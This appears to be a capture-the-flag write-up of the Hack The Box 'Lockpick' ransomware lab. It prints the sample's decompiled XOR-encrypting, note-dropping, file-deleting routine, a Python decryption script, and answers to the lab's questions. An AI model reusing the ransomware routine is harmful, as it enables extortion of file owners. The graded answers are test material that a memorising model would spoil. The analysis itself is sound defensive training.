Lockpick 

  

Forela needs your help! A whole portion of our UNIX servers have been hit with what we think is ransomware. We are refusing to pay the attackers and need you to find a way to recover the files provided. Warning This is a warning that this Sherlock includes software that is going to interact with your computer and files. This software has been intentionally included for educational purposes and is NOT intended to be executed or used otherwise. Always handle such files in isolated, controlled, and secure environments. Once the Sherlock zip has been unzipped, you will find a DANGER.txt file. Please read this to proceed. 

  

  

└──╼ [★]$ file ./bescrypt3.2  

./bescrypt3.2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2b6eafade391d7be39a8aff0d2e3a60aa8b6a4c2, for GNU/Linux 3.2.0, not stripped 

  

  

We opened up Ghidra and created a new project to analyze the file, during the analysis, we saw this: 

  

undefined8 main(void) 

  

{ 

  process_directory("/forela-criticaldata/","bhUlIshutrea98liOp"); 

  return 0; 

} 

  

Please confirm the encryption key string utilised for the encryption of the files provided? 

  

bhUlIshutrea98liOp 

  

  

Here is the encrypt_file() method from ghidra: 

  

void encrypt_file(char *param_1,char *param_2) 

  

{ 

  byte bVar1; 

  ulong uVar2; 

  int iVar3; 

  size_t sVar4; 

  char local_848 [1024]; 

  char local_448 [1032]; 

  FILE *local_40; 

  void *local_38; 

  size_t local_30; 

  FILE *local_28; 

  ulong local_20; 

   

  local_28 = fopen(param_1,"rb"); 

  if (local_28 == (FILE *)0x0) { 

    printf("Error opening file: %s\n",param_1); 

  } 

  else { 

    fseek(local_28,0,2); 

    local_30 = ftell(local_28); 

    rewind(local_28); 

    local_38 = malloc(local_30); 

    fread(local_38,1,local_30,local_28); 

    fclose(local_28); 

    for (local_20 = 0; uVar2 = local_20, (long)local_20 < (long)local_30; local_20 = local_20 + 1) { 

      bVar1 = *(byte *)((long)local_38 + local_20); 

      sVar4 = strlen(param_2); 

      *(byte *)((long)local_38 + local_20) = bVar1 ^ param_2[uVar2 % sVar4]; 

    } 

    snprintf(local_448,0x400,"%s.24bes",param_1); 

    local_28 = fopen(local_448,"wb"); 

    fwrite(local_38,1,local_30,local_28); 

    fclose(local_28); 

    free(local_38); 

    snprintf(local_848,0x400,"%s_note.txt",local_448); 

    local_40 = fopen(local_848,"w"); 

    if (local_40 == (FILE *)0x0) { 

      printf("Error creating note file: %s\n",local_848); 

    } 

    else { 

      fwrite("This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com  to discuss payment for us providing you the decryption software..\n" 

             ,1,0x99,local_40); 

      fclose(local_40); 

    } 

    iVar3 = remove(param_1); 

    if (iVar3 != 0) { 

      printf("Error deleting original file: %s\n",param_1); 

    } 

  } 

  return; 

  

XOR Operation: For each byte in the file, it performs an XOR (^) operation with a corresponding byte from the key (param_2), which is passed as a string. 

  

So the encryption pattern is XOR encryption with a repeating key 

"bhUlIshutrea98liOp" is the key 

  

  

In order to decrypt the files: 

Create a script called decrypt.py below: 

  

import sys 

  

def xor_decrypt(input_file, output_file, key): 

    # Open the encrypted file in binary read mode 

    with open(input_file, "rb") as f: 

        encrypted_data = f.read() 

  

    # Create a list to store the decrypted data 

    decrypted_data = bytearray() 

  

    # Get the length of the key 

    key_length = len(key) 

  

    # Perform XOR decryption (reversing the XOR encryption) 

    for i in range(len(encrypted_data)): 

        decrypted_data.append(encrypted_data[i] ^ ord(key[i % key_length])) 

  

    # Write the decrypted data to a new file 

    with open(output_file, "wb") as f: 

        f.write(decrypted_data) 

  

# Get the file name from command-line arguments 

if len(sys.argv) != 2: 

    print("Usage: python decrypt.py <encrypted_file>") 

    sys.exit(1) 

  

# Specify the encrypted file from the command-line argument 

encrypted_file = sys.argv[1] 

decrypted_file = encrypted_file.replace(".24bes", "")  # Decrypted file will have the same name without .24bes 

key = "bhUlIshutrea98liOp"  # The encryption key used 

  

# Call the decryption function 

xor_decrypt(encrypted_file, decrypted_file, key) 

  

print(f"File decrypted successfully! Decrypted file: {decrypted_file}") 

  

  

python decrypt.py forela_uk_applicants.sql.24bes 

  

  

  

We have recently recieved an email from wbevansn1@cocolog-nifty.com demanding to know the first and last name we have him registered as. They believe they made a mistake in the application process. Please confirm the first and last name of this applicant. 

  

└──╼ [★]$ grep -i 'wbevansn1@cocolog-nifty.com' forela_uk_applicants.sql 

(830,'Walden','Bevans','wbevansn1@cocolog-nifty.com','Male','Aerospace Manufacturing','2023-02-16'), 

  

  

What is the MAC address and serial number of the laptop assigned to Hart Manifould? 

  

Decrypt the it_assets.xml, and search for Hart Manifould 

  

<location>Room 477</location></record><record><asset_id>501</asset_id><MAC>E8-16-DF-E7-52-48</MAC><asset_type>laptop</asset_type><serial_number>1316262</serial_number><purchase_date>8/3/2022</purchase_date><last_patch_date>1/6/2023</last_patch_date><patch_status>pending</patch_status><assigned_to>Hart Manifould</assigned_to><location>Room 

  

  

What is the email address of the attacker? 

  

For every encrypted file, there's a test file that states "This file has been encrypted by bes24 group, please contact us at bes24@protonmail.com to discuss payment for us providing you the decryption software.." 

  

bes24@protonmail.com 

  

  

City of London Police have suspiciouns of some insider trading taking part within our trading organisation. Please confirm the email address of the person with the highest profit percentage in a single trade alongside the profit percentage. 

  

Decrypt the trading-firebase_bkup, find the trader with highest profit percentage 

  

"-NTy-crBi1fPrGaU6Uiu":{"id":1559,"first_name":"Farah","last_name":"Mosedale","email":"fmosedale17a@bizjournals.com","gender":"Female","ip_address":"79.9.35.201","stock_name":"Pennsylvania Real Estate Investment Trust","stock_symbol":"PEI^A","purchase_price":304.1,"sale_price":433048.13,"quantity":842496,"purchase_date":"5/1/2022","sale_date":"8/2/2022","profit":432744.03,"profit_percentage":142303.1996053929628411706675436,"industry":"Energy"}, 

"-NTy-crDAD4-F4el1JU9":{"id" 

  

fmosedale17a@bizjournals.com, 142303.1996053929628411706675436 

  

Our E-Discovery team would like to confirm the IP address detailed in the Sales Forecast log for a user who is suspected of sharing their account with a colleague. Please confirm the IP address for Karylin O'Hederscoll. 

  

It is in the sales_forecast excel 

  

8.254.104.208 

  

  

Which of the following file extensions is not targeted by the malware? .txt, .sql,.ppt, .pdf, .docx, .xlsx, .csv, .json, .xml 

  

.ppt 

When you read the process_directory() function, it doesn't target .ppt files 

  

  

We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the applicants DB. 

  

└──╼ [★]$ md5sum forela_uk_applicants.sql 

f3894af4f1ffa42b3a379dddba384405  forela_uk_applicants.sql 

  

We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the trading backup. 

  

  

└──╼ [★]$ md5sum trading-firebase_bkup.json 

87baa3a12068c471c3320b7f41235669  trading-firebase_bkup.json 

  

  

We need to confirm the integrity of the files once decrypted. Please confirm the MD5 hash of the complaints file. 

  

  

└──╼ [★]$ md5sum complaints.csv 

c3f05980d9bd945446f8a21bafdbf4e7  complaints.csv 

  

  

Incident: 

  

Active ransomware attack. 

  

We were able to figure out the encryption method, XOR, was being used by the attackers. 

  

Once figured out, we created an decryption tool with the key phrase to perform the decryption. 

  

  

 

 
